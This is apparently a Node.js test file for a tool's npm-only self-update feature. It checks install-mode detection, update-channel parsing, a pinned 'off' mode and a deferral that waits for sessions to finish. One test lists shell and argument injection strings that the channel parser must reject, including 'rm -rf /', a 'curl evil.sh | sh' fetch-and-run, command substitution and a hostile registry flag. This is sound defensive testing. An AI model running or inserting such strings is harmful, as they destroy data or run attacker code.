// Self-update tests. npm is the ONLY distribution channel — the manager never
// fetches/checks-out/builds from a git remote to update itself. The retired
// 'git' install mode (and its adoptRemoteBranch / detectRepoRoot /
// computeGitUpdateState machinery, plus the separate git-mode-update suite) was
// removed; what remains to prove here is:
//   - install-mode classification collapses to npm-global vs unknown;
//   - the update channel resolves safely (including the injection guard) and
//     reaches UpdateStatus;
//   - channel 'off' pins the build — no checker, no self-update;
//   - the embedded npm-global updater helper still parses.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fsp } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { execFileSync } from 'node:child_process';

import {
  classifyInstallMode,
  detectInstallMode,
  resolveUpdateChannel,
  isAutoUpdateDisabled,
  runSelfUpdate,
  _resetSelfUpdateInFlightForTests,
  UPDATE_CHANNEL_ENV,
  UPDATE_CHANNEL_OFF,
  UpdateChecker,
  _npmGlobalUpdaterSourceForTests,
} from '../dist/lib/self-update.js';

// ─── install mode ───────────────────────────────────────────────────────────
// Reachable npm → npm-global (auto-updatable via `npm i -g`); no npm → unknown
// (manual upgrade only). classifyInstallMode is the pure core, so the decision
// is testable without spawning npm; detectInstallMode wires the real probe.

test('classifyInstallMode: reachable npm → npm-global', () => {
  assert.equal(classifyInstallMode('/usr/lib/node_modules'), 'npm-global');
  // A locally-packed tarball installed to a custom prefix is still npm-managed.
  assert.equal(classifyInstallMode('/home/me/.npm-global/lib/node_modules'), 'npm-global');
});

test('classifyInstallMode: no npm → unknown (manual upgrade only)', () => {
  assert.equal(classifyInstallMode(null), 'unknown');
});

test('detectInstallMode: this checkout resolves npm-global (npm is on PATH in CI)', () => {
  assert.equal(detectInstallMode(), 'npm-global');
});

// ─── update channel ─────────────────────────────────────────────────────────

test('resolveUpdateChannel: defaults to latest', () => {
  assert.equal(resolveUpdateChannel(''), 'latest');
  assert.equal(resolveUpdateChannel(null), 'latest');
  assert.equal(resolveUpdateChannel('   '), 'latest');
});

test('resolveUpdateChannel: accepts dist-tags and exact versions', () => {
  assert.equal(resolveUpdateChannel('next'), 'next');
  assert.equal(resolveUpdateChannel('beta'), 'beta');
  assert.equal(resolveUpdateChannel('1.6.99'), '1.6.99');
  assert.equal(resolveUpdateChannel('1.7.0-rc.1'), '1.7.0-rc.1');
  assert.equal(resolveUpdateChannel('  next  '), 'next', 'surrounding whitespace is trimmed');
});

test('resolveUpdateChannel: off is recognized case-insensitively', () => {
  assert.equal(resolveUpdateChannel('off'), UPDATE_CHANNEL_OFF);
  assert.equal(resolveUpdateChannel('OFF'), UPDATE_CHANNEL_OFF);
  assert.equal(isAutoUpdateDisabled(resolveUpdateChannel('off')), true);
  assert.equal(isAutoUpdateDisabled(resolveUpdateChannel('latest')), false);
});

// The channel is interpolated into an `npm view` / `npm install -g` spec that
// runs with shell:true on Windows, so a hostile env value must never survive
// into the command. Anything outside the npm dist-tag/version charset falls
// back to the default channel rather than being passed through.
test('resolveUpdateChannel: rejects shell/argument injection attempts', () => {
  for (const evil of [
    'latest; rm -rf /',
    'latest && curl evil.sh | sh',
    'latest`whoami`',
    'latest $(id)',
    '--registry=https://evil.example',
    '../../etc/passwd',
    'latest\nnpm i -g evil',
    'latest evil-package',
    '@scope/evil',
    '-latest',
  ]) {
    assert.equal(resolveUpdateChannel(evil), 'latest', `must not pass through: ${JSON.stringify(evil)}`);
  }
});

test('UpdateChecker: channel reaches UpdateStatus and defaults to latest', () => {
  const c = new UpdateChecker({ log: () => {} });
  const s = c.status();
  assert.equal(s.install_mode, 'npm-global');
  assert.equal(s.update_channel, 'latest');
  assert.equal(typeof s.current_version, 'string');
  assert.notEqual(s.current_version, '0.0.0', 'the bundled version resolves from dist/package.json');
  // The retired git-mode fields must be gone from the wire contract.
  assert.equal('repo_root' in s, false);
  assert.equal('branch' in s, false);
  c.stop();
});

test('UpdateChecker: an explicit channel is carried through', () => {
  const c = new UpdateChecker({ log: () => {}, updateChannel: 'next' });
  assert.equal(c.status().update_channel, 'next');
  c.stop();
});

test('UpdateChecker: channel=off disables the poll loop entirely', () => {
  const logs = [];
  const c = new UpdateChecker({
    log: (m) => logs.push(m),
    updateChannel: UPDATE_CHANNEL_OFF,
    installMode: 'npm-global',
  });
  c.start();
  assert.match(logs.join('\n'), /auto-update disabled/i);
  // start() must not have armed a timer — a pinned build never polls the
  // registry, so the status stays exactly as constructed.
  const s = c.status();
  assert.equal(s.update_available, false);
  assert.equal(s.latest_version, null);
  assert.equal(s.last_checked_at, null);
  c.stop();
});

test('UpdateChecker: install_mode=unknown disables the poll loop', () => {
  const logs = [];
  const c = new UpdateChecker({ log: (m) => logs.push(m), installMode: 'unknown' });
  c.start();
  assert.match(logs.join('\n'), /npm is not reachable/i);
  assert.equal(c.status().last_checked_at, null);
  c.stop();
});

// ─── self-update entry point ────────────────────────────────────────────────

test('runSelfUpdate: channel=off refuses to touch the install', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const logs = [];
    const r = await runSelfUpdate({ log: (m) => logs.push(m), noReExec: true });
    assert.equal(r.changed, false);
    assert.match(r.summary, /pins this build/);
    assert.equal(r.willReExec, undefined);
    // Nothing resembling an install may have been attempted.
    assert.doesNotMatch(logs.join('\n'), /npm install -g/);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

// ticket b831b896: a self-update restart used to SIGTERM every in-flight
// chat/action/QA/ticket-dispatch session unconditionally — a session that
// had started 13 seconds earlier died mid-run and its failure got recorded
// with a guessed cause. runSelfUpdate now waits for countInFlightSessions()
// to drain (bounded by drainMaxWaitMs) before it goes anywhere near npm.
// channel=off short-circuits AFTER the drain wait, so these assert the
// deferral itself without ever touching the real registry/install.

test('runSelfUpdate: defers while sessions are in flight, proceeds once drained', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const logs = [];
    let calls = 0;
    // Reports 1 in-flight session for the first two polls, then drains.
    const countInFlightSessions = () => {
      calls += 1;
      return calls <= 2 ? 1 : 0;
    };
    const r = await runSelfUpdate({
      log: (m) => logs.push(m),
      noReExec: true,
      countInFlightSessions,
      drainPollMs: 5,
      drainMaxWaitMs: 5_000,
    });
    const joined = logs.join('\n');
    assert.match(joined, /deferring restart — 1 in-flight session/);
    assert.match(joined, /in-flight sessions drained — proceeding/);
    assert.ok(calls >= 3, 'must re-check after draining, not just once');
    // channel=off still short-circuits the actual install — proves the wait
    // ran to completion and returned control to the normal pipeline.
    assert.equal(r.changed, false);
    assert.match(r.summary, /pins this build/);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('runSelfUpdate: forces through once the drain wait cap elapses', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const logs = [];
    const countInFlightSessions = () => 2; // never drains
    const r = await runSelfUpdate({
      log: (m) => logs.push(m),
      noReExec: true,
      countInFlightSessions,
      drainPollMs: 5,
      drainMaxWaitMs: 25,
    });
    const joined = logs.join('\n');
    assert.match(joined, /deferring restart — 2 in-flight session/);
    assert.match(joined, /drain wait exceeded .*min cap — proceeding with 2 session/);
    // Forcing through means we still reach the normal pipeline afterward.
    assert.equal(r.changed, false);
    assert.match(r.summary, /pins this build/);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('runSelfUpdate: zero in-flight sessions never logs a deferral', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const logs = [];
    const r = await runSelfUpdate({
      log: (m) => logs.push(m),
      noReExec: true,
      countInFlightSessions: () => 0,
      drainPollMs: 5,
      drainMaxWaitMs: 5_000,
    });
    assert.doesNotMatch(logs.join('\n'), /deferring restart/);
    assert.equal(r.changed, false);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('runSelfUpdate: no countInFlightSessions callback → wait is skipped entirely (legacy callers)', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const logs = [];
    const r = await runSelfUpdate({ log: (m) => logs.push(m), noReExec: true });
    assert.doesNotMatch(logs.join('\n'), /deferring restart/);
    assert.equal(r.changed, false);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('embedded npm-global updater helper source is valid ESM (node --check)', async () => {
  const src = _npmGlobalUpdaterSourceForTests();
  assert.match(src, /npm.*install.*-g/s, 'helper must run `npm install -g`');
  const dir = await fsp.mkdtemp(join(tmpdir(), 'awb-helper-'));
  try {
    const f = join(dir, 'updater.mjs');
    await fsp.writeFile(f, src);
    // `node --check` parses (does not execute) — throws on any syntax error,
    // guarding the embedded string against silent rot.
    execFileSync('node', ['--check', f], { encoding: 'utf8' });
  } finally {
    await fsp.rm(dir, { recursive: true, force: true });
  }
});

// ─── git-mode removal regression ────────────────────────────────────────────
// The whole point of the removal: no self-update code path may shell out to git
// again. This asserts the compiled surface, so a future re-introduction fails
// here rather than silently shipping a second distribution channel.
test('compiled self-update carries no git invocation', async () => {
  const src = await fsp.readFile(new URL('../dist/lib/self-update.js', import.meta.url), 'utf8');
  assert.doesNotMatch(src, /'git'/, "self-update must not spawn git");
  assert.doesNotMatch(src, /checkout --detach|rev-parse|origin\//, 'no git plumbing may remain');
});

test('retired git-mode exports are gone', async () => {
  const mod = await import('../dist/lib/self-update.js');
  for (const name of ['adoptRemoteBranch', 'detectRepoRoot', 'computeGitUpdateState']) {
    assert.equal(mod[name], undefined, `${name} must not be exported anymore`);
  }
});
